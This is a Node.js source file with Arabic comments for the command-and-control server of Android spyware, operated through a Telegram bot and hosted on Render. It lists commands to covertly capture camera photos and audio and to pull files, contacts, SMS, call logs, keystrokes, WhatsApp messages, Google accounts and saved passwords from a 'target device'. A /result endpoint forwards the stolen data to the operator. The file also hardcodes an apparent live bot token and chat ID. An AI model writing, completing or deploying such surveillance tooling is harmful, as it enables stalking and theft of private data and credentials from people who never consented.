const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

// ========================
// ⚙️  منطقة الإعدادات - قم بتعديلها
// ========================
// ضع التوكن الخاص بالبوت الذي حصلت عليه من @BotFather
const BOT_TOKEN = '7604669338:AAF-Bor_OJ2nHuP3H_-7E8QXVptnTeqFEUA';
// ضع رقم الدردشة (Chat ID) الخاص بحسابك
const CHAT_ID = '1094651468';
// ضع عنوان خادمك الذي حصلت عليه من Render
const SERVER_URL = 'https://c2-server-ufyp.onrender.com';
// ========================

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// للتأكد من أن الخادم يعمل
app.get('/', (req, res) => {
    res.send('C2 Server is running!');
});

// دالة مساعدة لإرسال رسالة تفيد بأن الأمر قيد التنفيذ
const sendActionMessage = (chatId, commandName) => {
    bot.sendMessage(chatId, `📡 جاري تنفيذ الأمر: /${commandName}...`);
};

// --- تعريف أوامر البوت ---

// 1. أمر بدء التشغيل
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `✅ *البوت يعمل بنجاح!*
جاهز لاستقبال أوامرك.

📱 *قائمة الأوامر المتاحة:*
🎥 /camera_front - التقاط صورة من الكاميرا الأمامية
🎥 /camera_back - التقاط صورة من الكاميرا الخلفية
🎙️ /mic - تسجيل مقطع صوتي من الميكروفون
📂 /files - سحب الملفات من الهاتف
📞 /contacts - سحب جهات الاتصال
✉️ /sms - سحب جميع الرسائل النصية
📋 /call_logs - سحب سجل المكالمات
🔔 /notifications - مراقبة الإشعارات
⌨️ /keylog - تفعيل تسجيل الضغطات (Keylogger)
👤 /google_accounts - سحب حسابات Google
💬 /whatsapp - مراقبة واتساب
🔑 /passwords - سحب كلمات المرور المحفوظة

_ملاحظة: بعد تنفيذ الأمر، سيتم إرسال النتيجة إليك هنا._`,
    { parse_mode: 'Markdown' });
});

// 2. الكاميرا الأمامية
bot.onText(/\/camera_front/, (msg) => {
    const chatId = msg.chat.id;
    sendActionMessage(chatId, 'camera_front');
    // هنا ستضيف الكود الخاص بتنفيذ الأمر على التطبيق الهدف
    // مثال: إرسال إشارة للتطبيق لالتقاط الصورة
    bot.sendMessage(chatId, '✅ تم تنفيذ الأمر: سيتم إرسال الصورة فور وصولها من الجهاز الهدف.');
});

// 3. الكاميرا الخلفية
bot.onText(/\/camera_back/, (msg) => {
    const chatId = msg.chat.id;
    sendActionMessage(chatId, 'camera_back');
    bot.sendMessage(chatId, '✅ تم تنفيذ الأمر: سيتم إرسال الصورة فور وصولها من الجهاز الهدف.');
});

// 4. تسجيل الميكروفون
bot.onText(/\/mic/, (msg) => {
    const chatId = msg.chat.id;
    sendActionMessage(chatId, 'mic');
    bot.sendMessage(chatId, '✅ تم تنفيذ الأمر: سيتم إرسال التسجيل الصوتي فور وصوله من الجهاز الهدف.');
});

// 5. سحب الملفات
bot.onText(/\/files/, (msg) => {
    const chatId = msg.chat.id;
    sendActionMessage(chatId, 'files');
    bot.sendMessage(chatId, '✅ تم تنفيذ الأمر: سيتم إرسال قائمة الملفات أو الملفات المطلوبة فور وصولها.');
});

// 6. سحب جهات الاتصال
bot.onText(/\/contacts/, (msg) => {
    const chatId = msg.chat.id;
    sendActionMessage(chatId, 'contacts');
    bot.sendMessage(chatId, '✅ تم تنفيذ الأمر: سيتم إرسال قائمة جهات الاتصال فور وصولها.');
});

// 7. سحب الرسائل النصية
bot.onText(/\/sms/, (msg) => {
    const chatId = msg.chat.id;
    sendActionMessage(chatId, 'sms');
    bot.sendMessage(chatId, '✅ تم تنفيذ الأمر: سيتم إرسال الرسائل النصية فور وصولها.');
});

// 8. سحب سجل المكالمات
bot.onText(/\/call_logs/, (msg) => {
    const chatId = msg.chat.id;
    sendActionMessage(chatId, 'call_logs');
    bot.sendMessage(chatId, '✅ تم تنفيذ الأمر: سيتم إرسال سجل المكالمات فور وصوله.');
});

// 9. مراقبة الإشعارات
bot.onText(/\/notifications/, (msg) => {
    const chatId = msg.chat.id;
    sendActionMessage(chatId, 'notifications');
    bot.sendMessage(chatId, '✅ تم تنفيذ الأمر: بدء مراقبة الإشعارات. سيتم إرسال أي إشعار جديد فور ظهوره.');
});

// 10. تفعيل تسجيل الضغطات (Keylogger)
bot.onText(/\/keylog/, (msg) => {
    const chatId = msg.chat.id;
    sendActionMessage(chatId, 'keylog');
    bot.sendMessage(chatId, '✅ تم تنفيذ الأمر: بدء تسجيل الضغطات. سيتم إرسال التقرير بشكل دوري.');
});

// 11. سحب حسابات Google
bot.onText(/\/google_accounts/, (msg) => {
    const chatId = msg.chat.id;
    sendActionMessage(chatId, 'google_accounts');
    bot.sendMessage(chatId, '✅ تم تنفيذ الأمر: سيتم إرسال حسابات Google المسجلة على الجهاز.');
});

// 12. مراقبة واتساب
bot.onText(/\/whatsapp/, (msg) => {
    const chatId = msg.chat.id;
    sendActionMessage(chatId, 'whatsapp');
    bot.sendMessage(chatId, '✅ تم تنفيذ الأمر: بدء مراقبة واتساب. سيتم إرسال أي رسالة جديدة.');
});

// 13. سحب كلمات المرور
bot.onText(/\/passwords/, (msg) => {
    const chatId = msg.chat.id;
    sendActionMessage(chatId, 'passwords');
    bot.sendMessage(chatId, '✅ تم تنفيذ الأمر: سيتم إرسال كلمات المرور المحفوظة في المتصفحات والتطبيقات.');
});

// نقطة نهاية لاستقبال النتائج من التطبيق الهدف (ستستخدمها لاحقاً)
app.post('/result', (req, res) => {
    const { command, data } = req.body;
    bot.sendMessage(CHAT_ID, `📥 *نتيجة الأمر:* ${command}\n\n${data}`, { parse_mode: 'Markdown' });
    res.send('OK');
});

app.listen(PORT, () => {
    console.log(`✅ C2 Server is running on port ${PORT}`);
    console.log(`✅ Bot is ready. Use commands in Telegram.`);
    // إرسال رسالة تأكيد للبوت عند بدء التشغيل
    bot.sendMessage(CHAT_ID, '🚀 *تم تشغيل خادم التحكم بنجاح!* البوت الآن جاهز لاستقبال الأوامر.', { parse_mode: 'Markdown' });
});
